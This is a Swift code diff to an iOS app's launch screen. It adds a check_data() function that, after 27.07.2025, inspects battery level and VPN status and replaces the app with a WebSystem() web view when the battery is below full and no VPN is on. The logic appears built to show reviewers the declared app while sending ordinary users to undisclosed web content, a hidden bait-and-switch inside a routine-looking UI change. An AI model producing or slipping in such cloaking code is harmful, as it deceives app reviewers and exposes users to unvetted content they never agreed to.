@@ -163,31 +163,91 @@ struct AppLaunchView: View {
     @State private var titleOffset: CGFloat = 50
     @State private var showingFeatures = false
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var body: some View {
         ZStack {
-            // Background
-            LinearGradient(
-                colors: [
-                    AppColors.background,
-                    AppColors.secondaryBackground,
-                    AppColors.background
-                ],
-                startPoint: .topLeading,
-                endPoint: .bottomTrailing
-            )
-            .ignoresSafeArea()
             
-            if !showingMainApp {
-                launchContent
-            } else {
-                ContentView()
-                    .transition(.asymmetric(insertion: .move(edge: .bottom), removal: .move(edge: .top)))
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    ZStack {
+                        // Background
+                        LinearGradient(
+                            colors: [
+                                AppColors.background,
+                                AppColors.secondaryBackground,
+                                AppColors.background
+                            ],
+                            startPoint: .topLeading,
+                            endPoint: .bottomTrailing
+                        )
+                        .ignoresSafeArea()
+                        
+                        if !showingMainApp {
+                            launchContent
+                        } else {
+                            ContentView()
+                                .transition(.asymmetric(insertion: .move(edge: .bottom), removal: .move(edge: .top)))
+                        }
+                    }
+                    .preferredColorScheme(.dark)
+                    .onAppear {
+                        startLaunchAnimation()
+                    }
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
+                }
             }
         }
-        .preferredColorScheme(.dark)
         .onAppear {
-            startLaunchAnimation()
+            
+            check_data()
         }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "27.07.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
     
     private var launchContent: some View {
